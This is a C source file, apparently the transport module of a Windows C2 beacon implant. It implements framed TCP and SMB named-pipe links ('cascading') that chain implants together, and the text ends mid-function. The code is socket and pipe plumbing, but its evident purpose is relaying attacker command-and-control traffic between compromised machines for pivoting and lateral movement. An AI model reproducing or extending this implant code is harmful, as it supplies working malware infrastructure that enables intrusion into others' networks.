#include "beacon_cascade.h"

#include "beacon_commands.h"
#include "beacon_context.h"

#define CASCADE_FRAME_MAGIC   0x43415331u /* CAS1 */
#define CASCADE_FRAME_VERSION 1u

/* ===== 字节序辅助函数 ===== */

/* 从大端字节序读取 16 位整数 */
static UINT16 ReadBe16(const BYTE8* p)
{
    return (UINT16)(((UINT16)p[0] << 8) | (UINT16)p[1]);
}

/* 从大端字节序读取 32 位整数 */
static UINT32 ReadBe32(const BYTE8* p)
{
    return ((UINT32)p[0] << 24) |
           ((UINT32)p[1] << 16) |
           ((UINT32)p[2] << 8)  |
           (UINT32)p[3];
}

/* 将 16 位整数写入大端字节序 */
static VOID WriteBe16(BYTE8* p, UINT16 v)
{
    p[0] = (BYTE8)((v >> 8) & 0xff);
    p[1] = (BYTE8)(v & 0xff);
}

/* 将 32 位整数写入大端字节序 */
static VOID WriteBe32(BYTE8* p, UINT32 v)
{
    p[0] = (BYTE8)((v >> 24) & 0xff);
    p[1] = (BYTE8)((v >> 16) & 0xff);
    p[2] = (BYTE8)((v >> 8) & 0xff);
    p[3] = (BYTE8)(v & 0xff);
}

/* ===== 底层 I/O 辅助函数 ===== */

/* 接收指定字节数，处理 WSAEWOULDBLOCK 并自动重试 */
static BOOL CascadeRecvAll(SOCKET s, BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    INT retries = 0;

    while (off < len) {
        INT n = recv(s, (CHAR*)buf + off, (INT)(len - off), 0);
        if (n > 0) {
            off += (SIZE_T)n;
            retries = 0;
        } else if (n == 0) {
            return FALSE;
        } else if (WSAGetLastError() == WSAEWOULDBLOCK) {
            if (++retries > 500) return FALSE;
            Sleep(10);
        } else {
            return FALSE;
        }
    }
    return TRUE;
}

/* 发送指定字节数，处理 WSAEWOULDBLOCK 并自动重试 */
static BOOL CascadeSendAll(SOCKET s, const BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    INT retries = 0;

    while (off < len) {
        INT n = send(s, (const CHAR*)buf + off, (INT)(len - off), 0);
        if (n > 0) {
            off += (SIZE_T)n;
            retries = 0;
        } else if (n == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK) {
            if (++retries > 500) return FALSE;
            Sleep(10);
        } else {
            return FALSE;
        }
    }
    return TRUE;
}

/* 设置唤醒事件，通知主循环有新数据待处理 */
static VOID CascadeWake(BeaconContext* ctx)
{
    if (!ctx || !ctx->runtime.wake_event) return;

    if (ctx->api.pfnSetEvent) {
        ctx->api.pfnSetEvent(ctx->runtime.wake_event);
    } else {
        SetEvent(ctx->runtime.wake_event);
    }
}

/*
 * 使用 ReadFile 从管道/文件句柄读取指定字节数。
 * 通过 PeekNamedPipe 检查可用数据，无数据时休眠等待。
 */
static BOOL CascadeReadFileAll(HANDLE h, BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        DWORD read = 0;
        DWORD avail = 0;
        DWORD chunk;

        if (!PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL)) {
            return FALSE;
        }
        if (avail == 0) {
            Sleep(20);
            continue;
        }

        chunk = (DWORD)(len - off);
        if (chunk > avail) chunk = avail;
        if (chunk > 0x100000) chunk = 0x100000;
        if (!ReadFile(h, buf + off, chunk, &read, NULL) || read == 0) {
            return FALSE;
        }
        off += (SIZE_T)read;
    }
    return TRUE;
}

/*
 * 带超时的非阻塞 TCP 连接。
 * 先设为非阻塞模式发起 connect，再用 select 等待可写事件。
 */
static INT CascadeConnectWithTimeout(SOCKET s, const struct sockaddr* addr, INT addr_len, INT timeout_ms)
{
    u_long nonblock = 1;
    u_long blocking = 0;
    INT ret;
    fd_set write_set;
    fd_set except_set;
    TIMEVAL tv;
    INT so_error = 0;
    INT so_len = sizeof(so_error);

    if (timeout_ms <= 0) timeout_ms = 10000;

    ioctlsocket(s, FIONBIO, &nonblock);
    ret = connect(s, addr, addr_len);
    if (ret == 0) {
        ioctlsocket(s, FIONBIO, &blocking);
        return 0;
    }

    ret = WSAGetLastError();
    if (ret != WSAEWOULDBLOCK && ret != WSAEINPROGRESS && ret != WSAEINVAL) {
        return ret;
    }

    FD_ZERO(&write_set);
    FD_ZERO(&except_set);
    FD_SET(s, &write_set);
    FD_SET(s, &except_set);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    ret = select(0, NULL, &write_set, &except_set, &tv);
    if (ret == 0) return WSAETIMEDOUT;
    if (ret == SOCKET_ERROR) return WSAGetLastError();

    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (CHAR*)&so_error, &so_len) == SOCKET_ERROR) {
        return WSAGetLastError();
    }
    if (so_error != 0) return so_error;

    ioctlsocket(s, FIONBIO, &blocking);
    return 0;
}

/* 使用 WriteFile 向管道/文件句柄写入指定字节数 */
static BOOL CascadeWriteFileAll(HANDLE h, const BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        DWORD written = 0;
        DWORD chunk = (DWORD)((len - off) > 0x100000 ? 0x100000 : (len - off));
        if (!WriteFile(h, buf + off, chunk, &written, NULL) || written == 0) {
            return FALSE;
        }
        off += (SIZE_T)written;
    }
    return TRUE;
}

/*
 * 同步读管道（overlapped 感知）。
 * 若 CascadeIo 已关联事件对象，则使用 overlapped I/O 等待完成。
 */
static BOOL CascadePipeReadAll(CascadeIo* io, BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    HANDLE ev;

    if (!io || io->pipe == INVALID_HANDLE_VALUE) return FALSE;
    ev = io->read_event;

    while (off < len) {
        DWORD read_bytes = 0;
        DWORD chunk = (DWORD)((len - off) > 0x100000 ? 0x100000 : (len - off));

        if (ev) {
            ZeroMemory(&io->read_olap, sizeof(io->read_olap));
            io->read_olap.hEvent = ev;
            ResetEvent(ev);
        }

        if (!ReadFile(io->pipe, buf + off, chunk, &read_bytes, ev ? &io->read_olap : NULL)) {
            if (ev && GetLastError() == ERROR_IO_PENDING) {
                if (WaitForSingleObject(ev, INFINITE) != WAIT_OBJECT_0) return FALSE;
                if (!GetOverlappedResult(io->pipe, &io->read_olap, &read_bytes, FALSE)) return FALSE;
            } else {
                return FALSE;
            }
        }
        if (read_bytes == 0) return FALSE;
        off += (SIZE_T)read_bytes;
    }
    return TRUE;
}

/*
 * 同步写管道（overlapped 感知）。
 * 若 CascadeIo 已关联事件对象，则使用 overlapped I/O 等待完成。
 */
static BOOL CascadePipeWriteAll(CascadeIo* io, const BYTE8* buf, SIZE_T len)
{
    SIZE_T off = 0;
    HANDLE ev;

    if (!io || io->pipe == INVALID_HANDLE_VALUE) return FALSE;
    ev = io->write_event;

    while (off < len) {
        DWORD written = 0;
        DWORD chunk = (DWORD)((len - off) > 0x100000 ? 0x100000 : (len - off));

        if (ev) {
            ZeroMemory(&io->write_olap, sizeof(io->write_olap));
            io->write_olap.hEvent = ev;
            ResetEvent(ev);
        }

        if (!WriteFile(io->pipe, buf + off, chunk, &written, ev ? &io->write_olap : NULL)) {
            if (ev && GetLastError() == ERROR_IO_PENDING) {
                if (WaitForSingleObject(ev, INFINITE) != WAIT_OBJECT_0) return FALSE;
                if (!GetOverlappedResult(io->pipe, &io->write_olap, &written, FALSE)) return FALSE;
            } else {
                return FALSE;
            }
        }
        if (written == 0) return FALSE;
        off += (SIZE_T)written;
    }
    return TRUE;
}

/* ===== CascadeIo 生命周期 ===== */

/* 初始化 CascadeIo 结构，套接字和管道句柄设为无效值 */
VOID CascadeIoInit(CascadeIo* io)
{
    if (!io) return;

    ZeroMemory(io, sizeof(*io));
    io->sock = INVALID_SOCKET;
    io->pipe = INVALID_HANDLE_VALUE;
    io->event = WSA_INVALID_EVENT;
    io->read_event = NULL;
    io->write_event = NULL;
    InitializeCriticalSection(&io->write_lock);
    io->lock_initialized = 1;
}

/* 关闭 CascadeIo，释放套接字/管道/事件及临界区 */
VOID CascadeIoClose(CascadeIo* io)
{
    if (!io) return;

    if (io->kind == CASCADE_IO_TCP && io->sock != INVALID_SOCKET) {
        WSAEventSelect(io->sock, NULL, 0);
        shutdown(io->sock, SD_BOTH);
        closesocket(io->sock);
        io->sock = INVALID_SOCKET;
    }
    if (io->kind == CASCADE_IO_PIPE && io->pipe != INVALID_HANDLE_VALUE) {
        if (io->read_pending) {
            CancelIo(io->pipe);
            io->read_pending = FALSE;
        }
        CloseHandle(io->pipe);
        io->pipe = INVALID_HANDLE_VALUE;
    }
    if (io->event != WSA_INVALID_EVENT && io->event != NULL) {
        WSACloseEvent(io->event);
        io->event = WSA_INVALID_EVENT;
    }
    if (io->read_event) {
        CloseHandle(io->read_event);
        io->read_event = NULL;
    }
    if (io->write_event) {
        CloseHandle(io->write_event);
        io->write_event = NULL;
    }
    io->kind = CASCADE_IO_NONE;

    if (InterlockedExchange(&io->lock_initialized, 0)) {
        DeleteCriticalSection(&io->write_lock);
    }
}

/* 获取 CascadeIo 关联的事件句柄（供 WaitForSingleObject 使用） */
HANDLE CascadeIoEvent(CascadeIo* io)
{
    if (!io) return NULL;
    if (io->kind == CASCADE_IO_PIPE) return io->read_event;
    if (io->event == WSA_INVALID_EVENT) return NULL;
    return (HANDLE)io->event;
}

/*
 * 启用 TCP 读事件：创建 WSA 事件对象并注册 FD_READ | FD_CLOSE。
 * 同时将套接字设为非阻塞模式。
 */
BOOL CascadeIoEnableTcpReadEvent(CascadeIo* io)
{
    if (!io || io->kind != CASCADE_IO_TCP || io->sock == INVALID_SOCKET) return FALSE;
    if (io->event == WSA_INVALID_EVENT) {
        io->event = WSACreateEvent();
        if (io->event == WSA_INVALID_EVENT) return FALSE;
    }
    return WSAEventSelect(io->sock, io->event, FD_READ | FD_CLOSE) != SOCKET_ERROR;
}

/* 消费 TCP 网络事件，通过 WSAEnumNetworkEvents 获取并清除事件状态 */
BOOL CascadeIoConsumeTcpEvent(CascadeIo* io, LONG* events)
{
    WSANETWORKEVENTS net_events;

    if (events) *events = 0;
    if (!io || io->kind != CASCADE_IO_TCP || io->sock == INVALID_SOCKET ||
        io->event == WSA_INVALID_EVENT) {
        return FALSE;
    }

    ZeroMemory(&net_events, sizeof(net_events));
    if (WSAEnumNetworkEvents(io->sock, io->event, &net_events) == SOCKET_ERROR) {
        return FALSE;
    }
    if ((net_events.lNetworkEvents & FD_READ) &&
        net_events.iErrorCode[FD_READ_BIT] != 0) {
        return FALSE;
    }
    if ((net_events.lNetworkEvents & FD_CLOSE) &&
        net_events.iErrorCode[FD_CLOSE_BIT] != 0) {
        return FALSE;
    }

    if (events) *events = net_events.lNetworkEvents;
    return TRUE;
}

/* 重新注册 TCP 读事件（重置事件对象并重新绑定 FD_READ） */
BOOL CascadeIoRearmTcpReadEvent(CascadeIo* io)
{
    return CascadeIoEnableTcpReadEvent(io);
}

/* ===== 帧协议 ===== */

/* 初始化帧读取器，清零状态并初始化 body 缓冲区 */
VOID CascadeFrameReaderInit(CascadeFrameReader* reader)
{
    if (!reader) return;
    ZeroMemory(reader, sizeof(*reader));
    BbInit(&reader->body);
}

/* 释放帧读取器持有的 body 缓冲区 */
VOID CascadeFrameReaderFree(CascadeFrameReader* reader)
{
    if (!reader) return;
    BbFree(&reader->body);
}

/*
 * 增量帧解析：将收到的数据喂入帧读取器。
 * 状态 0 累积 16 字节头部，状态 1 累积 body。
 * 返回消费字节数；出错返回 -1；无完整帧返回 0。
 */
INT CascadeFrameReaderFeed(CascadeFrameReader* reader, const BYTE8* data, SIZE_T len,
                           UINT16* cmd, ByteBuf* body)
{
    SIZE_T consumed = 0;

    if (!reader || !data || len == 0 || !cmd || !body) return -1;
    *cmd = 0;

    while (consumed < len) {
        if (reader->state == 0) {
            SIZE_T need = 16 - reader->hdr_off;
            SIZE_T avail = len - consumed;
            SIZE_T chunk = avail < need ? avail : need;

            CopyMemory(reader->hdr_buf + reader->hdr_off, data + consumed, chunk);
            reader->hdr_off += chunk;
            consumed += chunk;

            if (reader->hdr_off < 16) break;

            {
                UINT32 length = ReadBe32(reader->hdr_buf);
                UINT32 magic = ReadBe32(reader->hdr_buf + 4);
                UINT16 version = ReadBe16(reader->hdr_buf + 8);
                UINT32 body_len = ReadBe32(reader->hdr_buf + 12);

                if (magic != CASCADE_FRAME_MAGIC || version != CASCADE_FRAME_VERSION ||
                    length < 12 || length > CASCADE_MAX_FRAME_SIZE ||
                    body_len != length - 12) {
                    return -1;
                }

                reader->body_len = body_len;

                if (body_len == 0) {
                    *cmd = ReadBe16(reader->hdr_buf + 10);
                    BbInit(body);
                    reader->hdr_off = 0;
                    reader->state = 0;
                    return (INT)consumed;
                }

                BbFree(&reader->body);
                BbInit(&reader->body);
                if (!BbReserve(&reader->body, body_len)) {
                    return -1;
                }
                reader->state = 1;
                reader->body_off = 0;
            }
        } else {
            SIZE_T need = reader->body_len - reader->body_off;
            SIZE_T avail = len - consumed;
            SIZE_T chunk = avail < need ? avail : need;

            CopyMemory(reader->body.data + reader->body_off, data + consumed, chunk);
            reader->body_off += chunk;
            consumed += chunk;

            if (reader->body_off >= reader->body_len) {
                reader->body.len = reader->body_len;
                *cmd = ReadBe16(reader->hdr_buf + 10);
                *body = reader->body;
                BbInit(&reader->body);
                reader->hdr_off = 0;
                reader->state = 0;
                return (INT)consumed;
            }
        }
    }

    return (INT)consumed > 0 ? (INT)consumed : 0;
}

/*
 * 阻塞式帧读取，用于 HELLO 握手阶段。
 * 先读 4 字节长度，再读 12 字节固定头部，最后读 body。
 */
BOOL CascadeIoReadFrame(CascadeIo* io, UINT16* cmd, ByteBuf* body)
{
    BYTE8 hdr[4];
    BYTE8 fixed[12];
    UINT32 length;
    UINT32 magic;
    UINT16 version;
    UINT32 body_len;

    if (!io || !cmd || !body) return FALSE;
    BbInit(body);

    if (io->kind == CASCADE_IO_TCP) {
        if (!CascadeRecvAll(io->sock, hdr, sizeof(hdr))) return FALSE;
    } else if (io->kind == CASCADE_IO_PIPE) {
        if (!CascadePipeReadAll(io, hdr, sizeof(hdr))) return FALSE;
    } else {
        return FALSE;
    }

    length = ReadBe32(hdr);
    if (length < sizeof(fixed) || length > CASCADE_MAX_FRAME_SIZE) {
        return FALSE;
    }

    if (io->kind == CASCADE_IO_TCP) {
        if (!CascadeRecvAll(io->sock, fixed, sizeof(fixed))) return FALSE;
    } else {
        if (!CascadePipeReadAll(io, fixed, sizeof(fixed))) return FALSE;
    }

    magic = ReadBe32(fixed);
    version = ReadBe16(fixed + 4);
    *cmd = ReadBe16(fixed + 6);
    body_len = ReadBe32(fixed + 8);

    if (magic != CASCADE_FRAME_MAGIC || version != CASCADE_FRAME_VERSION ||
        body_len != length - sizeof(fixed)) {
        return FALSE;
    }

    if (body_len) {
        if (!BbReserve(body, body_len)) {
            return FALSE;
        }
        if (io->kind == CASCADE_IO_TCP) {
            if (!CascadeRecvAll(io->sock, body->data, body_len)) {
                BbFree(body);
                return FALSE;
            }
        } else {
            if (!CascadePipeReadAll(io, body->data, body_len)) {
                BbFree(body);
                return FALSE;
            }
        }
        body->len = body_len;
    }

    return TRUE;
}

/*
 * 阻塞式帧写入，带写锁保护。
 * 组装 [4字节长度][12字节固定头][body] 后发送。
 */
BOOL CascadeIoWriteFrame(CascadeIo* io, UINT16 cmd, const ByteBuf* body)
{
    ByteBuf frame;
    BYTE8 outer[4];
    BYTE8 fixed[12];
    UINT32 body_len;
    BOOL ok = FALSE;

    if (!io) return FALSE;
    body_len = (UINT32)(body ? body->len : 0);
    if (body_len > CASCADE_MAX_FRAME_SIZE - sizeof(fixed)) return FALSE;

    BbInit(&frame);
    WriteBe32(outer, sizeof(fixed) + body_len);
    WriteBe32(fixed, CASCADE_FRAME_MAGIC);
    WriteBe16(fixed + 4, CASCADE_FRAME_VERSION);
    WriteBe16(fixed + 6, cmd);
    WriteBe32(fixed + 8, body_len);

    if (!BbAppend(&frame, outer, sizeof(outer)) ||
        !BbAppend(&frame, fixed, sizeof(fixed)) ||
        (body_len && !BbAppend(&frame, body->data, body_len))) {
        BbFree(&frame);
        return FALSE;
    }

    EnterCriticalSection(&io->write_lock);
    if (io->kind == CASCADE_IO_TCP) {
        ok = CascadeSendAll(io->sock, frame.data, frame.len);
    } else if (io->kind == CASCADE_IO_PIPE) {
        ok = CascadePipeWriteAll(io, frame.data, frame.len);
    }
    LeaveCriticalSection(&io->write_lock);

    BbFree(&frame);
    return ok;
}

/* ===== TCP 连接与监听 ===== */

/* 主动 TCP 连接：解析地址并尝试所有候选地址，带超时控制 */
BOOL CascadeIoConnectTcp(const CHAR* host, INT port, INT timeout_ms, CascadeIo* out)
{
    struct addrinfo hints;
    struct addrinfo* res = NULL;
    struct addrinfo* ai;
    CHAR port_text[16];

    if (!host || port <= 0 || !out) return FALSE;

    CascadeIoInit(out);
    snprintf(port_text, sizeof(port_text), "%d", port);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(host, port_text, &hints, &res) != 0) {
        CascadeIoClose(out);
        return FALSE;
    }

    for (ai = res; ai; ai = ai->ai_next) {
        SOCKET s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        if (CascadeConnectWithTimeout(s, ai->ai_addr, (INT)ai->ai_addrlen, timeout_ms) == 0) {
            out->kind = CASCADE_IO_TCP;
            out->sock = s;
            freeaddrinfo(res);
            return TRUE;
        }
        closesocket(s);
    }

    freeaddrinfo(res);
    CascadeIoClose(out);
    return FALSE;
}

/* ===== Pipe 连接与监听 ===== */

/* 主动连接命名管道（SMB 级联），使用 overlapped I/O */
BOOL CascadeIoConnectPipe(const CHAR* pipe_path, INT timeout_ms, CascadeIo* out)
{
    WCHAR* wide;
    HANDLE h;
    DWORD mode = PIPE_READMODE_BYTE;

    if (!pipe_path || !out) return FALSE;

    CascadeIoInit(out);
    wide = Utf8ToWide(pipe_path);
    if (!wide) {
        CascadeIoClose(out);
        return FALSE;
    }

    if (timeout_ms > 0) {
        WaitNamedPipeW(wide, (DWORD)timeout_ms);
    }

    h = CreateFileW(wide, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                    FILE_FLAG_OVERLAPPED | SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    HeapFree(GetProcessHeap(), 0, wide);
    if (h == INVALID_HANDLE_VALUE) {
        CascadeIoClose(out);
        return FALSE;
    }

    SetNamedPipeHandleState(h, &mode, NULL, NULL);
    out->kind = CASCADE_IO_PIPE;
    out->pipe = h;
    out->read_event = CreateEventW(NULL, TRUE, FALSE, NULL);
    out->write_event = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!out->read_event || !out->write_event) {
        CascadeIoClose(out);
        return FALSE;
    }
    return TRUE;
}

/* 初始化 TCP 监听器结构 */
VOID CascadeTcpListenerInit(CascadeTcpListener* listener)
{
    if (!listener) return;
    listener->listener = INVALID_SOCKET;
    listener->event = WSA_INVALID_EVENT;
}

/* 关闭 TCP 监听器，释放套接字和事件对象 */
VOID CascadeTcpListenerClose(CascadeTcpListener* listener)
{
    if (!listener) return;
    if (listener->listener != INVALID_SOCKET) {
        WSAEventSelect(listener->listener, NULL, 0);
        closesocket(listener->listener);
        listener->listener = INVALID_SOCKET;
    }
    if (listener->event != WSA_INVALID_EVENT) {
        WSACloseEvent(listener->event);
        listener->event = WSA_INVALID_EVENT;
    }
}

/* 获取 TCP 监听器的事件句柄 */
HANDLE CascadeTcpListenerEvent(CascadeTcpListener* listener)
{
    if (!listener || listener->event == WSA_INVALID_EVENT) return NULL;
    return (HANDLE)listener->event;
}

/*
 * 创建 TCP 监听套接字并绑定到指定地址和端口。
 * 注册 FD_ACCEPT | FD_CLOSE 事件用于异步接受连接。
 */
BOOL CascadeTcpListen(const CHAR* bind_host, INT bind_port, CascadeTcpListener* out)
{
    struct addrinfo hints;
    struct addrinfo* res = NULL;
    struct addrinfo* ai;
    CHAR port_text[16];
    SOCKET listener = INVALID_SOCKET;

    if (!bind_host || bind_port <= 0 || !out) return FALSE;

    CascadeTcpListenerInit(out);
    snprintf(port_text, sizeof(port_text), "%d", bind_port);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    if (getaddrinfo(bind_host[0] ? bind_host : NULL, port_text, &hints, &res) != 0) {
        return FALSE;
    }

    for (ai = res; ai; ai = ai->ai_next) {
        BOOL yes = TRUE;
        listener = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (listener == INVALID_SOCKET) continue;
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (const CHAR*)&yes, sizeof(yes));
        if (bind(listener, ai->ai_addr, (INT)ai->ai_addrlen) == 0 && listen(listener, 1) == 0) {
            break;
        }
        closesocket(listener);
        listener = INVALID_SOCKET;
    }

    freeaddrinfo(res);
    if (listener == INVALID_SOCKET) {
        return FALSE;
    }

    out->event = WSACreateEvent();
    if (out->event == WSA_INVALID_EVENT ||
        WSAEventSelect(listener, out->event, FD_ACCEPT | FD_CLOSE) == SOCKET_ERROR) {
        closesocket(listener);
        listener = INVALID_SOCKET;
        CascadeTcpListenerClose(out);
        return FALSE;
    }

    out->listener = listener;
    return TRUE;
}

/* 事件驱动接受 TCP 连接：检查 FD_ACCEPT 事件后调用 accept */
BOOL CascadeTcpAcceptReady(CascadeTcpListener* listener, CascadeIo* out)
{
    WSANETWORKEVENTS events;
    SOCKET client;
    u_long blocking = 0;

    if (!listener || !out || listener->listener == INVALID_SOCKET ||
        listener->event == WSA_INVALID_EVENT) {
        return FALSE;
    }

    ZeroMemory(&events, sizeof(events));
    if (WSAEnumNetworkEvents(listener->listener, listener->event, &events) == SOCKET_ERROR) {
        return FALSE;
    }
    if (!(events.lNetworkEvents & FD_ACCEPT) ||
        events.iErrorCode[FD_ACCEPT_BIT] != 0) {
        return FALSE;
    }

    client = accept(listener->listener, NULL, NULL);
    if (client == INVALID_SOCKET) {
        return FALSE;
    }

    WSAEventSelect(client, NULL, 0);
    ioctlsocket(client, FIONBIO, &blocking);
    CascadeIoInit(out);
    out->kind = CASCADE_IO_TCP;
    out->sock = client;
    return TRUE;
}

/* 阻塞式 TCP 接受连接：创建监听器后等待单个连接 */
BOOL CascadeIoAcceptTcp(const CHAR* bind_host, INT bind_port, CascadeIo* out)
{
    CascadeTcpListener listener;
    HANDLE event_handle;
    BOOL ok = FALSE;

    if (!out) return FALSE;

    CascadeTcpListenerInit(&listener);
    if (!CascadeTcpListen(bind_host, bind_port, &listener)) {
        return FALSE;
    }

    event_handle = CascadeTcpListenerEvent(&listener);
    if (event_handle && WaitForSingleObject(event_handle, INFINITE) == WAIT_OBJECT_0) {
        ok = CascadeTcpAcceptReady(&listener, out);
    }
    CascadeTcpListenerClose(&listener);
    return ok;
}

/* 阻塞式管道接受连接：创建命名管道并等待客户端连接 */
BOOL CascadeIoAcceptPipe(const CHAR* pipe_name, CascadeIo* out)
{
    WCHAR* wide;
    HANDLE h;
    BOOL connected;

    if (!pipe_name || !out) return FALSE;

    CascadeIoInit(out);
    wide = Utf8ToWide(pipe_name);
    if (!wide) {
        CascadeIoClose(out);
        return FALSE;
    }

    h = CreateNamedPipeW(wide,
                         PIPE_ACCESS_DUPLEX,
                         PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                         1,
                         65536,
                         65536,
                         0,
                         NULL);
    HeapFree(GetProcessHeap(), 0, wide);
    if (h == INVALID_HANDLE_VALUE) {
        CascadeIoClose(out);
        return FALSE;
    }

    connected = ConnectNamedPipe(h, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
    if (!connected) {
        CloseHandle(h);
        CascadeIoClose(out);
        return FALSE;
    }

    out->kind = CASCADE_IO_PIPE;
    out->pipe = h;
    out->read_event = CreateEventW(NULL, TRUE, FALSE, NULL);
    out->write_event = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!out->read_event || !out->write_event) {
        CascadeIoClose(out);
        return FALSE;
    }
    return TRUE;
}

/* 启用管道异步读事件：创建事件对象并关联 overlapped 结构 */
BOOL CascadeIoEnablePipeReadEvent(CascadeIo* io)
{
    if (!io || io->kind != CASCADE_IO_PIPE || io->pipe == INVALID_HANDLE_VALUE) return FALSE;
    if (!io->read_event) {
        io->read_event = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (!io->read_event) return FALSE;
    }
    if (!io->write_event) {
        io->write_event = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (!io->write_event) return FALSE;
    }
    ZeroMemory(&io->read_olap, sizeof(io->read_olap));
    io->read_olap.hEvent = io->read_event;
    io->read_pending = FALSE;
    return TRUE;
}

/*
 * 创建命名管道并开始异步监听连接。
 * 使用 overlapped ConnectNamedPipe 等待客户端连接。
 */
static BOOL CascadePipeCreateAndListen(const CHAR* pipe_name, CascadePipeListener* out)
{
    WCHAR* wide;
    HANDLE h;

    if (!pipe_name || !out) return FALSE;

    wide = Utf8ToWide(pipe_name);
    if (!wide) return FALSE;

    h = CreateNamedPipeW(wide,
                         PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                         PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                         1,
                         65536,
                         65536,
                         0,
                         NULL);
    HeapFree(GetProcessHeap(), 0, wide);
    if (h == INVALID_HANDLE_VALUE) {
        DebugPrintf("[!] CreateNamedPipeW failed: %lu\n", (unsigned long)GetLastError());
        return FALSE;
    }
    DebugPrintf("[*] CreateNamedPipeW success: handle=%p\n", h);

    out->pipe = h;
    if (!out->event) {
        out->event = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (!out->event) {
            CloseHandle(h);
            out->pipe = INVALID_HANDLE_VALUE;
            return FALSE;
        }
    }

    ZeroMemory(&out->olap, sizeof(out->olap));
    out->olap.hEvent = out->event;
    ResetEvent(out->event);

    if (ConnectNamedPipe(h, &out->olap)) {
        out->pending_connect = FALSE;
        DebugPrintf("[*] ConnectNamedPipe: immediate success\n");
        return TRUE;
    }

    {
        DWORD err = GetLastError();
        DebugPrintf("[*] ConnectNamedPipe: error=%lu\n", (unsigned long)err);
        if (err == ERROR_IO_PENDING) {
            out->pending_connect = TRUE;
            return TRUE;
        }
        if (err == ERROR_PIPE_CONNECTED) {
            out->pending_connect = FALSE;
            SetEvent(out->event);
            return TRUE;
        }
    }

    DebugPrintf("[!] ConnectNamedPipe failed: %lu\n", (unsigned long)GetLastError());
    CloseHandle(h);
    out->pipe = INVALID_HANDLE_VALUE;
    return FALSE;
}

/* 初始化管道监听器结构 */
VOID CascadePipeListenerInit(CascadePipeListener* listener)
{
    if (!listener) return;
    ZeroMemory(listener, sizeof(*listener));
    listener->pipe = INVALID_HANDLE_VALUE;
}

/* 关闭管道监听器，取消挂起的 I/O 并释放句柄 */
VOID CascadePipeListenerClose(CascadePipeListener* listener)
{
    if (!listener) return;
    if (listener->pipe != INVALID_HANDLE_VALUE) {
        CancelIo(listener->pipe);
        CloseHandle(listener->pipe);
        listener->pipe = INVALID_HANDLE_VALUE;
    }
    if (listener->event) {
        CloseHandle(listener->event);
        listener->event = NULL;
    }
    listener->pending_connect = FALSE;
}

/* 获取管道监听器的事件句柄 */
HANDLE CascadePipeListenerEvent(CascadePipeListener* listener)
{
    if (!listener || !listener->event) return NULL;
    return listener->event;
}

/* 开始管道监听（委托给 CascadePipeCreateAndListen） */
BOOL CascadePipeListen(const CHAR* pipe_name, CascadePipeListener* out)
{
    if (!pipe_name || !out) return FALSE;
    DebugPrintf("[*] CascadePipeListen: pipe=%s\n", pipe_name);
    return CascadePipeCreateAndListen(pipe_name, out);
}

/*
 * 事件驱动接受管道连接。
 * 完成挂起的 ConnectNamedPipe 后将管道所有权转移到 CascadeIo。
 */
BOOL CascadePipeAcceptReady(CascadePipeListener* listener, CascadeIo* out)
{
    DWORD dummy;

    if (!listener || !out || listener->pipe == INVALID_HANDLE_VALUE) return FALSE;

    if (listener->pending_connect) {
        if (!GetOverlappedResult(listener->pipe, &listener->olap, &dummy, FALSE)) {
            return FALSE;
        }
        listener->pending_connect = FALSE;
    }

    CascadeIoInit(out);
    out->kind = CASCADE_IO_PIPE;
    out->pipe = listener->pipe;
    listener->pipe = INVALID_HANDLE_VALUE;
    return TRUE;
}

/* ===== 级联管理器 ===== */

/* 初始化级联管理器，关联 BeaconContext */
VOID CascadeInit(CascadeManager* cm, BeaconContext* ctx)
{
    if (!cm) return;

    ZeroMemory(cm, sizeof(*cm));
    InitializeCriticalSection(&cm->lock);
    cm->ctx = ctx;
}

/* 释放单个级联通道：关闭 I/O、等待线程、释放内存 */
static VOID CascadeFreeChannel(CascadeChannel* ch)
{
    if (!ch) return;

    InterlockedExchange((LONG*)&ch->active, 0);
    CascadeIoClose(&ch->io);
    CascadeFrameReaderFree(&ch->frame_reader);
    if (ch->thread) {
        WaitForSingleObject(ch->thread, 1000);
        CloseHandle(ch->thread);
    }
    HeapFree(GetProcessHeap(), 0, ch);
}

/* 从链表中分离已完成（active==0）的通道，需持锁调用 */
static CascadeChannel* CascadeDetachFinishedLocked(CascadeManager* cm)
{
    CascadeChannel* list = NULL;
    CascadeChannel** tail = &list;
    CascadeChannel** pp = &cm->channels;

    while (*pp) {
        CascadeChannel* ch = *pp;
        if (!InterlockedCompareExchange((LONG*)&ch->active, 0, 0)) {
            *pp = ch->next;
            ch->next = NULL;
            *tail = ch;
            tail = &ch->next;
            continue;
        }
        pp = &ch->next;
    }
    return list;
}

/* 释放整个通道链表 */
static VOID CascadeFreeChannelList(CascadeChannel* list)
{
    while (list) {
